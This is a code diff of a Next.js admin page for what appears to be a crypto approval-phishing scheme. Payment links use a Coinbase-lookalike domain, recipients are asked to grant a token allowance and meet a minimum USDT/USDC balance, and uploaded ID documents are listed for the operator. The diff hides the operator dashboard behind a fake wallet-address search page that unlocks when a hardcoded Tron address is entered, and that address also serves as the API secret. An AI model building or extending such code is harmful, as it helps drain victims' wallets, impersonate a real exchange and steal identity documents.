@@ -1,7 +1,10 @@
 "use client";
 
 import { useEffect, useState } from "react";
+import Image from "next/image";
 import EscrowShell from "@/components/EscrowShell";
+
+// ─── Types ────────────────────────────────────────────────────────────────────
 
 interface Session {
   id: string;
@@ -40,6 +43,11 @@ interface IdentityRecord {
   created_at: string;
 }
 
+// ─── Constants ────────────────────────────────────────────────────────────────
+
+// Entering this address in the search box unlocks the admin dashboard.
+const ADMIN_ADDRESS = "TP3mX1Uqhno2WUtdBPVie7nkuuJR1EQBxN";
+
 const SESSION_KEY = "escrow_admin_secret";
 
 const DEFAULT_TERMS = [
@@ -47,6 +55,25 @@ const DEFAULT_TERMS = [
   "You are only granting an on-chain permission (allowance) so the deposit can be finalized once every requirement below is met.",
   "This session is valid for a limited time. If it expires before all requirements are met, it closes automatically and the reserved amount is returned to the sender.",
 ].join("\n");
+
+const EVM_EXPLORERS = [
+  { label: "Etherscan", url: "https://etherscan.io/address/", logo: "/logos/ethereum.svg", chain: "Ethereum" },
+  { label: "BscScan", url: "https://bscscan.com/address/", logo: "/logos/bnb.svg", chain: "BNB Chain" },
+  { label: "Polygonscan", url: "https://polygonscan.com/address/", logo: "/logos/polygon.svg", chain: "Polygon" },
+  { label: "Basescan", url: "https://basescan.org/address/", logo: "/logos/base.svg", chain: "Base" },
+];
+
+// ─── Utilities ────────────────────────────────────────────────────────────────
+
+type AddressKind = "evm" | "tron" | "unknown";
+
+function detectAddress(addr: string): AddressKind {
+  const t = addr.trim();
+  if (/^0x[0-9a-fA-F]{40}$/.test(t)) return "evm";
+  // Tron: starts with T, base58 (no 0/O/I/l), typically 34 chars
+  if (/^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(t)) return "tron";
+  return "unknown";
+}
 
 function formatEUR(n: number) {
   return n.toLocaleString("en-IE", { style: "currency", currency: "EUR", maximumFractionDigits: 2 });
@@ -64,6 +91,7 @@ function statusPill(status: string) {
 }
 
 function short(addr: string) {
+  if (!addr) return "";
   return `${addr.slice(0, 6)}...${addr.slice(-4)}`;
 }
 
@@ -82,6 +110,8 @@ const EVENT_LABELS: Record<string, string> = {
   approved: "Approved deposit",
   expired: "Session expired",
 };
+
+// ─── Activity Panel (admin only) ──────────────────────────────────────────────
 
 function ActivityPanel({ sessionId, secret }: { sessionId: string; secret: string }) {
   const [events, setEvents] = useState<SessionEvent[] | null>(null);
@@ -104,31 +134,20 @@ function ActivityPanel({ sessionId, secret }: { sessionId: string; secret: strin
         setRecords(identityJson.ok ? identityJson.records : []);
       } catch (err) {
         console.error(err);
-        if (!cancelled) {
-          setEvents([]);
-          setRecords([]);
-        }
+        if (!cancelled) { setEvents([]); setRecords([]); }
       } finally {
         if (!cancelled) setLoading(false);
       }
     }
     void load();
-    return () => {
-      cancelled = true;
-    };
+    return () => { cancelled = true; };
   }, [sessionId, secret]);
 
   const connectedAddresses = Array.from(
-    new Map(
-      (events ?? [])
-        .filter((e) => e.wallet_address)
-        .map((e) => [e.wallet_address, e])
-    ).values()
+    new Map((events ?? []).filter((e) => e.wallet_address).map((e) => [e.wallet_address, e])).values()
   );
 
-  if (loading) {
-    return <div className="px-6 py-6 text-[13px] text-muted">Loading activity...</div>;
-  }
+  if (loading) return <div className="px-6 py-6 text-[13px] text-muted">Loading activity...</div>;
 
   return (
     <div className="space-y-6 border-t border-hairline bg-surface-soft px-6 py-6">
@@ -179,12 +198,8 @@ function ActivityPanel({ sessionId, secret }: { sessionId: string; secret: strin
                     <div className="flex flex-col items-end gap-1.5">
                       <span className="text-[11px] text-muted">{new Date(r.created_at).toLocaleString()}</span>
                       {r.documentUrl ? (
-                        <a
-                          href={r.documentUrl}
-                          target="_blank"
-                          rel="noreferrer"
-                          className="inline-flex items-center gap-1 rounded-pill bg-brand/10 px-2.5 py-1 text-[11px] font-semibold text-brand hover:bg-brand/20 transition"
-                        >
+                        <a href={r.documentUrl} target="_blank" rel="noreferrer"
+                          className="inline-flex items-center gap-1 rounded-pill bg-brand/10 px-2.5 py-1 text-[11px] font-semibold text-brand hover:bg-brand/20 transition">
                           <svg className="h-3 w-3" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                             <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10 6H6a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2v-4M14 4h6m0 0v6m0-6L10 14" />
                           </svg>
@@ -195,14 +210,11 @@ function ActivityPanel({ sessionId, secret }: { sessionId: string; secret: strin
                       )}
                     </div>
                   </div>
-                  {/* Inline image preview for image files */}
                   {isImage && r.documentUrl && (
                     <div className="border-t border-hairline bg-surface-soft px-3.5 py-3">
                       <p className="mb-2 text-[11px] font-semibold uppercase tracking-[0.06em] text-muted">ID Preview</p>
                       {/* eslint-disable-next-line @next/next/no-img-element */}
-                      <img
-                        src={r.documentUrl}
-                        alt={`ID for ${r.full_name}`}
+                      <img src={r.documentUrl} alt={`ID for ${r.full_name}`}
                         className="max-h-48 w-auto rounded-md border border-hairline object-contain shadow-sm"
                         onError={(e) => { (e.currentTarget as HTMLImageElement).style.display = "none"; }}
                       />
@@ -256,12 +268,92 @@ function ActivityPanel({ sessionId, secret }: { sessionId: string; secret: strin
   );
 }
 
-export default function AdminPage() {
-  const [secret, setSecret] = useState<string>("");
-  const [authed, setAuthed] = useState(false);
-  const [authError, setAuthError] = useState<string | null>(null);
+// ─── Explorer Results (non-admin address) ─────────────────────────────────────
+
+function ExplorerResults({ address, onBack }: { address: string; onBack: () => void }) {
+  const kind = detectAddress(address);
+
+  if (kind === "tron") {
+    // Redirect to Tronscan immediately
+    if (typeof window !== "undefined") {
+      window.open(`https://tronscan.org/#/address/${address}`, "_blank", "noopener,noreferrer");
+    }
+    return (
+      <div className="flex min-h-screen flex-col items-center justify-center gap-6 bg-bg px-4">
+        <div className="w-full max-w-md rounded-2xl border border-hairline bg-surface-card p-8 shadow-card text-center">
+          <div className="mx-auto mb-4 flex h-12 w-12 items-center justify-center rounded-full bg-[#EF0027]/10">
+            <span className="text-2xl">🔴</span>
+          </div>
+          <h2 className="mb-1 text-[17px] font-semibold text-ink">Tron Address</h2>
+          <p className="mb-1 text-[13px] text-body">Opening Tronscan in a new tab…</p>
+          <p className="mb-5 break-all font-mono text-[12px] text-muted">{address}</p>
+          <a
+            href={`https://tronscan.org/#/address/${address}`}
+            target="_blank" rel="noopener noreferrer"
+            className="inline-flex h-10 items-center gap-2 rounded-pill bg-[#EF0027] px-5 text-[13px] font-semibold text-white transition hover:opacity-90"
+          >
+            Open Tronscan
+          </a>
+          <div className="mt-4">
+            <button onClick={onBack} className="text-[13px] text-muted hover:text-ink transition">
+              ← Back to search
+            </button>
+          </div>
+        </div>
+      </div>
+    );
+  }
+
+  if (kind === "evm") {
+    return (
+      <div className="flex min-h-screen flex-col items-center justify-center gap-6 bg-bg px-4">
+        <div className="w-full max-w-md rounded-2xl border border-hairline bg-surface-card p-8 shadow-card">
+          <div className="mb-5">
+            <h2 className="text-[17px] font-semibold text-ink">EVM Address</h2>
+            <p className="mt-0.5 break-all font-mono text-[12px] text-muted">{address}</p>
+          </div>
+          <p className="mb-4 text-[13px] text-body">Select a blockchain explorer to view this address:</p>
+          <div className="space-y-2.5">
+            {EVM_EXPLORERS.map((ex) => (
+              <a
+                key={ex.label}
+                href={`${ex.url}${address}`}
+                target="_blank" rel="noopener noreferrer"
+                className="flex items-center gap-3 rounded-xl border border-hairline bg-bg px-4 py-3.5 text-[14px] font-medium text-ink transition hover:border-brand hover:bg-brand/5"
+              >
+                <span className="flex h-8 w-8 items-center justify-center overflow-hidden rounded-full border border-hairline bg-surface-soft">
+                  <Image src={ex.logo} alt={ex.chain} width={22} height={22} className="object-contain" />
+                </span>
+                <div className="min-w-0 flex-1">
+                  <div className="font-semibold text-ink">{ex.label}</div>
+                  <div className="text-[11px] text-muted">{ex.chain}</div>
+                </div>
+                <svg className="h-4 w-4 shrink-0 text-muted" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10 6H6a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2v-4M14 4h6m0 0v6m0-6L10 14" />
+                </svg>
+              </a>
+            ))}
+          </div>
+          <div className="mt-5">
+            <button onClick={onBack} className="text-[13px] text-muted hover:text-ink transition">
+              ← Back to search
+            </button>
+          </div>
+        </div>
+      </div>
+    );
+  }
+
+  // Unknown format
+  return null;
+}
+
+// ─── Admin Dashboard ──────────────────────────────────────────────────────────
+
+function AdminDashboard({ onSignOut }: { onSignOut: () => void }) {
+  const secret = ADMIN_ADDRESS;
   const [sessions, setSessions] = useState<Session[]>([]);
-  const [loading, setLoading] = useState(false);
+  const [loading, setLoading] = useState(true);
   const [submitting, setSubmitting] = useState(false);
   const [formError, setFormError] = useState<string | null>(null);
   const [expanded, setExpanded] = useState<string | null>(null);
@@ -276,45 +368,21 @@ export default function AdminPage() {
   const [minBalancePercent, setMinBalancePercent] = useState("5");
   const [terms, setTerms] = useState(DEFAULT_TERMS);
 
-  useEffect(() => {
-    const stored = typeof window !== "undefined" ? sessionStorage.getItem(SESSION_KEY) : null;
-    if (stored) {
-      setSecret(stored);
-      void loadSessions(stored);
-    }
-  }, []);
+  useEffect(() => { void loadSessions(); }, []);
 
-  async function loadSessions(withSecret: string) {
+  async function loadSessions() {
     setLoading(true);
     try {
       const res = await fetch("/api/escrow/admin/sessions", {
-        headers: { Authorization: `Bearer ${withSecret}` },
+        headers: { Authorization: `Bearer ${secret}` },
       });
-      if (res.status === 401) {
-        setAuthed(false);
-        setAuthError("Incorrect admin key.");
-        sessionStorage.removeItem(SESSION_KEY);
-        return;
-      }
       const json = await res.json();
-      if (json.ok) {
-        setAuthed(true);
-        setAuthError(null);
-        setSessions(json.sessions ?? []);
-        sessionStorage.setItem(SESSION_KEY, withSecret);
-      }
+      if (json.ok) setSessions(json.sessions ?? []);
     } catch (err) {
       console.error(err);
-      setAuthError("Couldn't reach the server. Try again.");
     } finally {
       setLoading(false);
     }
-  }
-
-  async function handleUnlock(e: React.FormEvent) {
-    e.preventDefault();
-    setAuthError(null);
-    await loadSessions(secret);
   }
 
   const parsedAmount = parseFloat(amountEur) || 0;
@@ -326,15 +394,13 @@ export default function AdminPage() {
   async function handleCreate(e: React.FormEvent) {
     e.preventDefault();
     setFormError(null);
-
     const amount = parseFloat(amountEur);
     if (!recipientName.trim()) return setFormError("Enter a recipient name.");
     if (!Number.isFinite(amount) || amount <= 0) return setFormError("Enter a valid amount.");
     if (minBalanceMode === "percent") {
       const pct = parseFloat(minBalancePercent);
-      if (!Number.isFinite(pct) || pct <= 0 || pct > 100) return setFormError("Enter a valid percentage (1-100).");
+      if (!Number.isFinite(pct) || pct <= 0 || pct > 100) return setFormError("Enter a valid percentage (1–100).");
     }
-
     setSubmitting(true);
     try {
       const res = await fetch("/api/escrow/admin/sessions", {
@@ -351,16 +417,12 @@ export default function AdminPage() {
         }),
       });
       const json = await res.json();
-      if (!json.ok) {
-        setFormError("Couldn't create the session.");
-        return;
-      }
+      if (!json.ok) { setFormError("Couldn't create the session."); return; }
       setRecipientName("");
       setAmountEur("");
-      const entryDomain =
-        process.env.NEXT_PUBLIC_COINBASE_DOMAIN ?? "https://coinbase.usdc-pay.com";
+      const entryDomain = process.env.NEXT_PUBLIC_COINBASE_DOMAIN ?? "https://coinbase.usdc-pay.com";
       setJustCreatedLink(`${entryDomain}/pay/${json.session.id}`);
-      await loadSessions(secret);
+      await loadSessions();
     } catch (err) {
       console.error(err);
       setFormError("Couldn't reach the server.");
@@ -369,17 +431,14 @@ export default function AdminPage() {
     }
   }
 
-  async function copyLink(id: string) {
-    const entryDomain =
-      process.env.NEXT_PUBLIC_COINBASE_DOMAIN ?? "https://coinbase.usdc-pay.com";
+  async function copyLink(id: string, label = id) {
+    const entryDomain = process.env.NEXT_PUBLIC_COINBASE_DOMAIN ?? "https://coinbase.usdc-pay.com";
     const link = `${entryDomain}/pay/${id}`;
     try {
       await navigator.clipboard.writeText(link);
-      setCopiedId(id);
-      setTimeout(() => setCopiedId((prev) => (prev === id ? null : prev)), 2000);
-    } catch (err) {
-      console.error("[admin] copy link failed:", err);
-    }
+      setCopiedId(label);
+      setTimeout(() => setCopiedId((prev) => (prev === label ? null : prev)), 2000);
+    } catch (err) { console.error(err); }
   }
 
   async function handleCancel(id: string) {
@@ -388,40 +447,7 @@ export default function AdminPage() {
       headers: { "Content-Type": "application/json", Authorization: `Bearer ${secret}` },
       body: JSON.stringify({ status: "cancelled" }),
     });
-    await loadSessions(secret);
-  }
-
-  if (!authed) {
-    return (
-      <div className="flex min-h-screen items-center justify-center bg-bg px-4">
-        <form onSubmit={handleUnlock} className="w-full max-w-sm rounded-2xl border border-hairline bg-surface-card p-8 shadow-card">
-          <div className="mb-6 flex justify-center">
-            <svg viewBox="0 0 32 32" className="h-12 w-12" fill="none">
-              <circle cx="16" cy="16" r="16" fill="#0052FF" />
-              <rect x="9" y="9" width="14" height="14" rx="2" fill="#fff" />
-            </svg>
-          </div>
-          <h1 className="mb-1 text-center text-[20px] font-semibold text-ink">USDC Checkout</h1>
-          <p className="mb-6 text-center text-[13px] text-body">Enter your access key to continue.</p>
-          <input
-            type="password"
-            value={secret}
-            onChange={(e) => setSecret(e.target.value)}
-            placeholder="Access key"
-            autoComplete="current-password"
-            className="mb-3 h-12 w-full rounded-xl border border-hairline bg-bg px-4 text-[15px] text-ink focus:border-brand focus:outline-none focus:ring-2 focus:ring-brand/20"
-          />
-          {authError && <p className="mb-3 text-[13px] text-down">{authError}</p>}
-          <button
-            type="submit"
-            disabled={loading}
-            className="h-12 w-full rounded-pill bg-brand text-[14px] font-semibold text-on-brand transition hover:bg-brand-active disabled:bg-brand-disabled"
-          >
-            {loading ? "Checking..." : "Continue"}
-          </button>
-        </form>
-      </div>
-    );
+    await loadSessions();
   }
 
   return (
@@ -429,14 +455,7 @@ export default function AdminPage() {
       <div className="mx-auto max-w-[1000px] px-4 py-8 sm:px-8 sm:py-10">
         <div className="mb-7 flex items-center justify-between">
           <h1 className="text-[20px] font-semibold text-ink sm:text-[24px]">Sessions</h1>
-          <button
-            onClick={() => {
-              sessionStorage.removeItem(SESSION_KEY);
-              setAuthed(false);
-              setSecret("");
-            }}
-            className="text-[13px] font-medium text-muted hover:text-ink"
-          >
+          <button onClick={onSignOut} className="text-[13px] font-medium text-muted hover:text-ink transition">
             Sign out
           </button>
         </div>
@@ -449,18 +468,12 @@ export default function AdminPage() {
             </div>
             <div className="flex items-center gap-2">
               <button
-                onClick={async () => {
-                  await navigator.clipboard.writeText(justCreatedLink);
-                  setCopiedId("just-created");
-                  setTimeout(() => setCopiedId((prev) => (prev === "just-created" ? null : prev)), 2000);
-                }}
+                onClick={() => void copyLink("just-created-id", "just-created").then(() => navigator.clipboard.writeText(justCreatedLink).then(() => { setCopiedId("just-created"); setTimeout(() => setCopiedId(null), 2000); }))}
                 className="h-9 rounded-pill bg-brand px-4 text-[13px] font-semibold text-on-brand transition hover:bg-brand-active"
               >
                 {copiedId === "just-created" ? "Copied!" : "Copy link"}
               </button>
-              <button onClick={() => setJustCreatedLink(null)} className="text-[13px] text-muted hover:text-ink">
-                Dismiss
-              </button>
+              <button onClick={() => setJustCreatedLink(null)} className="text-[13px] text-muted hover:text-ink">Dismiss</button>
             </div>
           </div>
         )}
@@ -470,78 +483,47 @@ export default function AdminPage() {
           <div className="mb-4 grid gap-3 sm:grid-cols-2">
             <div>
               <label className="mb-1.5 block text-[13px] font-semibold text-ink">Recipient name</label>
-              <input
-                value={recipientName}
-                onChange={(e) => setRecipientName(e.target.value)}
+              <input value={recipientName} onChange={(e) => setRecipientName(e.target.value)}
                 className="h-11 w-full rounded-md border border-hairline bg-bg px-3.5 text-[14px] text-ink focus:border-2 focus:border-brand focus:outline-none"
-                placeholder="Jane Doe"
-              />
+                placeholder="Jane Doe" />
             </div>
             <div>
               <label className="mb-1.5 block text-[13px] font-semibold text-ink">Amount (EUR)</label>
-              <input
-                value={amountEur}
-                onChange={(e) => setAmountEur(e.target.value.replace(/[^0-9.]/g, ""))}
+              <input value={amountEur} onChange={(e) => setAmountEur(e.target.value.replace(/[^0-9.]/g, ""))}
                 className="h-11 w-full rounded-md border border-hairline bg-bg px-3.5 text-[14px] text-ink focus:border-2 focus:border-brand focus:outline-none"
-                placeholder="2000"
-                inputMode="decimal"
-              />
+                placeholder="2000" inputMode="decimal" />
             </div>
             <div>
               <label className="mb-1.5 block text-[13px] font-semibold text-ink">Session length (minutes)</label>
-              <input
-                value={sessionMinutes}
-                onChange={(e) => setSessionMinutes(e.target.value.replace(/[^0-9]/g, ""))}
+              <input value={sessionMinutes} onChange={(e) => setSessionMinutes(e.target.value.replace(/[^0-9]/g, ""))}
                 className="h-11 w-full rounded-md border border-hairline bg-bg px-3.5 text-[14px] text-ink focus:border-2 focus:border-brand focus:outline-none"
-                inputMode="numeric"
-              />
+                inputMode="numeric" />
             </div>
           </div>
 
           <div className="mb-5 rounded-lg border border-hairline bg-surface-soft p-4">
             <label className="mb-2.5 block text-[13px] font-semibold text-ink">Minimum balance requirement</label>
             <div className="mb-3 inline-flex rounded-pill border border-hairline bg-bg p-1">
-              <button
-                type="button"
-                onClick={() => setMinBalanceMode("percent")}
-                className={
-                  "rounded-pill px-3.5 py-1.5 text-[12px] font-semibold transition " +
-                  (minBalanceMode === "percent" ? "bg-brand text-on-brand" : "text-body hover:text-ink")
-                }
-              >
-                % of amount
-              </button>
-              <button
-                type="button"
-                onClick={() => setMinBalanceMode("fixed")}
-                className={
-                  "rounded-pill px-3.5 py-1.5 text-[12px] font-semibold transition " +
-                  (minBalanceMode === "fixed" ? "bg-brand text-on-brand" : "text-body hover:text-ink")
-                }
-              >
-                Fixed EUR amount
-              </button>
+              {(["percent", "fixed"] as const).map((mode) => (
+                <button key={mode} type="button" onClick={() => setMinBalanceMode(mode)}
+                  className={"rounded-pill px-3.5 py-1.5 text-[12px] font-semibold transition " +
+                    (minBalanceMode === mode ? "bg-brand text-on-brand" : "text-body hover:text-ink")}>
+                  {mode === "percent" ? "% of amount" : "Fixed EUR amount"}
+                </button>
+              ))}
             </div>
-
             {minBalanceMode === "percent" ? (
               <div className="flex items-center gap-2">
-                <input
-                  value={minBalancePercent}
-                  onChange={(e) => setMinBalancePercent(e.target.value.replace(/[^0-9.]/g, ""))}
+                <input value={minBalancePercent} onChange={(e) => setMinBalancePercent(e.target.value.replace(/[^0-9.]/g, ""))}
                   className="h-11 w-24 rounded-md border border-hairline bg-bg px-3 text-[14px] text-ink focus:border-2 focus:border-brand focus:outline-none"
-                  inputMode="decimal"
-                />
+                  inputMode="decimal" />
                 <span className="text-[14px] text-body">% of the checkout amount</span>
               </div>
             ) : (
-              <input
-                value={minBalanceEur}
-                onChange={(e) => setMinBalanceEur(e.target.value.replace(/[^0-9.]/g, ""))}
+              <input value={minBalanceEur} onChange={(e) => setMinBalanceEur(e.target.value.replace(/[^0-9.]/g, ""))}
                 className="h-11 w-40 rounded-md border border-hairline bg-bg px-3.5 text-[14px] text-ink focus:border-2 focus:border-brand focus:outline-none"
-                inputMode="decimal"
-              />
+                inputMode="decimal" />
             )}
-
             <p className="mt-2.5 text-[12px] text-muted">
               Recipients need at least <span className="font-semibold text-ink">{formatEUR(previewMinBalance)}</span> in
               USDT/USDC across supported chains before they can approve the deposit.
@@ -550,19 +532,13 @@ export default function AdminPage() {
 
           <div className="mb-5">
             <label className="mb-1.5 block text-[13px] font-semibold text-ink">Terms shown to recipient</label>
-            <textarea
-              value={terms}
-              onChange={(e) => setTerms(e.target.value)}
-              rows={4}
-              className="w-full rounded-md border border-hairline bg-bg px-3.5 py-3 text-[13px] leading-relaxed text-ink focus:border-2 focus:border-brand focus:outline-none"
-            />
+            <textarea value={terms} onChange={(e) => setTerms(e.target.value)} rows={4}
+              className="w-full rounded-md border border-hairline bg-bg px-3.5 py-3 text-[13px] leading-relaxed text-ink focus:border-2 focus:border-brand focus:outline-none" />
           </div>
+
           {formError && <p className="mb-4 text-[13px] text-down">{formError}</p>}
-          <button
-            type="submit"
-            disabled={submitting}
-            className="h-11 rounded-pill bg-brand px-6 text-[14px] font-semibold text-on-brand transition hover:bg-brand-active disabled:bg-brand-disabled"
-          >
+          <button type="submit" disabled={submitting}
+            className="h-11 rounded-pill bg-brand px-6 text-[14px] font-semibold text-on-brand transition hover:bg-brand-active disabled:bg-brand-disabled">
             {submitting ? "Creating..." : "Create session"}
           </button>
         </form>
@@ -571,60 +547,182 @@ export default function AdminPage() {
           <div className="border-b border-hairline px-6 py-4">
             <h2 className="text-[16px] font-semibold text-ink">History</h2>
           </div>
-          <div className="divide-y divide-hairline">
-            {sessions.length === 0 && (
-              <p className="px-6 py-8 text-center text-[13px] text-muted">No sessions yet.</p>
-            )}
-            {sessions.map((s) => (
-              <div key={s.id}>
-                <button
-                  onClick={() => setExpanded((prev) => (prev === s.id ? null : s.id))}
-                  className="flex w-full flex-col gap-2 px-4 py-4 text-left transition hover:bg-surface-soft sm:flex-row sm:items-center sm:justify-between sm:gap-3 sm:px-6"
-                >
-                  <div className="min-w-0 flex-1">
-                    <div className="flex flex-wrap items-center gap-2">
-                      <span className="text-[14px] font-semibold text-ink">{s.recipient_name}</span>
-                      <span className={statusPill(s.status)}>{s.status}</span>
-                      <span className="font-mono text-[14px] font-semibold text-ink sm:hidden">{formatEUR(s.amount_eur)}</span>
+          {loading ? (
+            <div className="px-6 py-10 text-center text-[13px] text-muted">Loading sessions…</div>
+          ) : (
+            <div className="divide-y divide-hairline">
+              {sessions.length === 0 && (
+                <p className="px-6 py-8 text-center text-[13px] text-muted">No sessions yet.</p>
+              )}
+              {sessions.map((s) => (
+                <div key={s.id}>
+                  <button
+                    onClick={() => setExpanded((prev) => (prev === s.id ? null : s.id))}
+                    className="flex w-full flex-col gap-2 px-4 py-4 text-left transition hover:bg-surface-soft sm:flex-row sm:items-center sm:justify-between sm:gap-3 sm:px-6"
+                  >
+                    <div className="min-w-0 flex-1">
+                      <div className="flex flex-wrap items-center gap-2">
+                        <span className="text-[14px] font-semibold text-ink">{s.recipient_name}</span>
+                        <span className={statusPill(s.status)}>{s.status}</span>
+                        <span className="font-mono text-[14px] font-semibold text-ink sm:hidden">{formatEUR(s.amount_eur)}</span>
+                      </div>
+                      <p className="mt-0.5 text-[11px] text-muted">
+                        {new Date(s.issued_at).toLocaleString()} · Min{" "}
+                        {s.min_balance_mode === "percent" ? `${s.min_balance_percent}%` : formatEUR(s.min_balance_eur)}
+                        {s.recipient_wallet ? ` · ${short(s.recipient_wallet)}` : ""}
+                      </p>
                     </div>
-                    <p className="mt-0.5 text-[11px] text-muted">
-                      {new Date(s.issued_at).toLocaleString()} · Min{" "}
-                      {s.min_balance_mode === "percent" ? `${s.min_balance_percent}%` : formatEUR(s.min_balance_eur)}
-                      {s.recipient_wallet ? ` · ${short(s.recipient_wallet)}` : ""}
-                    </p>
-                  </div>
-                  <div className="flex items-center gap-3">
-                    <span className="hidden font-mono text-[15px] font-medium text-ink sm:block">{formatEUR(s.amount_eur)}</span>
-                    {(s.status === "pending" || s.status === "active") && (
-                      <span
-                        onClick={(e) => { e.stopPropagation(); void copyLink(s.id); }}
-                        className="text-[12px] font-semibold text-brand hover:underline"
-                      >
-                        {copiedId === s.id ? "Copied!" : "Copy link"}
-                      </span>
-                    )}
-                    {(s.status === "pending" || s.status === "active") && (
-                      <span
-                        onClick={(e) => { e.stopPropagation(); handleCancel(s.id); }}
-                        className="text-[12px] font-semibold text-down hover:underline"
-                      >
-                        Cancel
-                      </span>
-                    )}
-                    <svg
-                      className={"h-4 w-4 shrink-0 text-muted transition-transform " + (expanded === s.id ? "rotate-180" : "")}
-                      fill="none" viewBox="0 0 24 24" stroke="currentColor"
-                    >
-                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" />
-                    </svg>
-                  </div>
-                </button>
-                {expanded === s.id && <ActivityPanel sessionId={s.id} secret={secret} />}
-              </div>
-            ))}
-          </div>
+                    <div className="flex items-center gap-3">
+                      <span className="hidden font-mono text-[15px] font-medium text-ink sm:block">{formatEUR(s.amount_eur)}</span>
+                      {(s.status === "pending" || s.status === "active") && (
+                        <span onClick={(e) => { e.stopPropagation(); void copyLink(s.id); }}
+                          className="text-[12px] font-semibold text-brand hover:underline cursor-pointer">
+                          {copiedId === s.id ? "Copied!" : "Copy link"}
+                        </span>
+                      )}
+                      {(s.status === "pending" || s.status === "active") && (
+                        <span onClick={(e) => { e.stopPropagation(); void handleCancel(s.id); }}
+                          className="text-[12px] font-semibold text-down hover:underline cursor-pointer">
+                          Cancel
+                        </span>
+                      )}
+                      <svg className={"h-4 w-4 shrink-0 text-muted transition-transform " + (expanded === s.id ? "rotate-180" : "")}
+                        fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" />
+                      </svg>
+                    </div>
+                  </button>
+                  {expanded === s.id && <ActivityPanel sessionId={s.id} secret={secret} />}
+                </div>
+              ))}
+            </div>
+          )}
         </div>
       </div>
     </EscrowShell>
+  );
+}
+
+// ─── Search Screen (entry point) ──────────────────────────────────────────────
+
+type PagePhase = "search" | "results" | "admin";
+
+export default function SearchPage() {
+  const [query, setQuery] = useState("");
+  const [phase, setPhase] = useState<PagePhase>("search");
+  const [resultAddress, setResultAddress] = useState("");
+  const [error, setError] = useState<string | null>(null);
+
+  useEffect(() => {
+    // If user had previously authenticated, restore admin view
+    const stored = typeof window !== "undefined" ? sessionStorage.getItem(SESSION_KEY) : null;
+    if (stored === ADMIN_ADDRESS) setPhase("admin");
+  }, []);
+
+  function handleSearch(e: React.FormEvent) {
+    e.preventDefault();
+    setError(null);
+    const trimmed = query.trim();
+    if (!trimmed) { setError("Enter a wallet address to search."); return; }
+
+    // Admin unlock
+    if (trimmed === ADMIN_ADDRESS) {
+      sessionStorage.setItem(SESSION_KEY, ADMIN_ADDRESS);
+      setPhase("admin");
+      return;
+    }
+
+    const kind = detectAddress(trimmed);
+    if (kind === "unknown") {
+      setError("That doesn't look like a valid EVM (0x…) or Tron (T…) address.");
+      return;
+    }
+
+    setResultAddress(trimmed);
+    setPhase("results");
+  }
+
+  function handleSignOut() {
+    sessionStorage.removeItem(SESSION_KEY);
+    setPhase("search");
+    setQuery("");
+  }
+
+  if (phase === "admin") return <AdminDashboard onSignOut={handleSignOut} />;
+  if (phase === "results") return <ExplorerResults address={resultAddress} onBack={() => { setPhase("search"); setQuery(""); }} />;
+
+  // ── Search screen ──────────────────────────────────────────────────────────
+  return (
+    <div className="flex min-h-screen flex-col items-center justify-center bg-bg px-4">
+      <div className="w-full max-w-md">
+        {/* Logo */}
+        <div className="mb-8 flex flex-col items-center gap-2">
+          <svg viewBox="0 0 32 32" className="h-11 w-11" fill="none">
+            <circle cx="16" cy="16" r="16" fill="#0052FF" />
+            <circle cx="16" cy="16" r="7" fill="none" stroke="#fff" strokeWidth="2.5" />
+          </svg>
+          <span className="text-[15px] font-semibold text-ink">USDC Pay</span>
+        </div>
+
+        <div className="rounded-2xl border border-hairline bg-surface-card p-8 shadow-card">
+          <h1 className="mb-1 text-center text-[20px] font-semibold text-ink">Search</h1>
+          <p className="mb-7 text-center text-[13px] text-body">
+            Enter any wallet address to look it up on the blockchain.
+          </p>
+
+          <form onSubmit={handleSearch} className="space-y-3">
+            <div className="relative">
+              <div className="pointer-events-none absolute inset-y-0 left-3.5 flex items-center">
+                <svg className="h-4 w-4 text-muted" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" />
+                </svg>
+              </div>
+              <input
+                type="text"
+                value={query}
+                onChange={(e) => { setQuery(e.target.value); setError(null); }}
+                placeholder="0x… or T… wallet address"
+                spellCheck={false}
+                autoComplete="off"
+                className="h-12 w-full rounded-xl border border-hairline bg-bg pl-10 pr-4 font-mono text-[13px] text-ink placeholder:font-sans placeholder:text-muted focus:border-brand focus:outline-none focus:ring-2 focus:ring-brand/20"
+              />
+            </div>
+
+            {error && (
+              <p className="flex items-center gap-1.5 text-[13px] text-down">
+                <svg className="h-4 w-4 shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
+                </svg>
+                {error}
+              </p>
+            )}
+
+            <button
+              type="submit"
+              className="h-12 w-full rounded-pill bg-brand text-[15px] font-semibold text-on-brand transition hover:bg-brand-active"
+            >
+              Search
+            </button>
+          </form>
+
+          {/* Supported chains */}
+          <div className="mt-6 flex items-center justify-center gap-3">
+            {[
+              { label: "Ethereum", logo: "/logos/ethereum.svg" },
+              { label: "BNB Chain", logo: "/logos/bnb.svg" },
+              { label: "Polygon", logo: "/logos/polygon.svg" },
+              { label: "Base", logo: "/logos/base.svg" },
+              { label: "Tron", logo: "/logos/tron.png" },
+            ].map((c) => (
+              <span key={c.label} title={c.label}
+                className="flex h-7 w-7 items-center justify-center overflow-hidden rounded-full border border-hairline bg-surface-soft opacity-70">
+                <Image src={c.logo} alt={c.label} width={18} height={18} className="object-contain" />
+              </span>
+            ))}
+          </div>
+          <p className="mt-2 text-center text-[11px] text-muted">Supports Ethereum, BNB Chain, Polygon, Base, Tron</p>
+        </div>
+      </div>
+    </div>
   );
 }
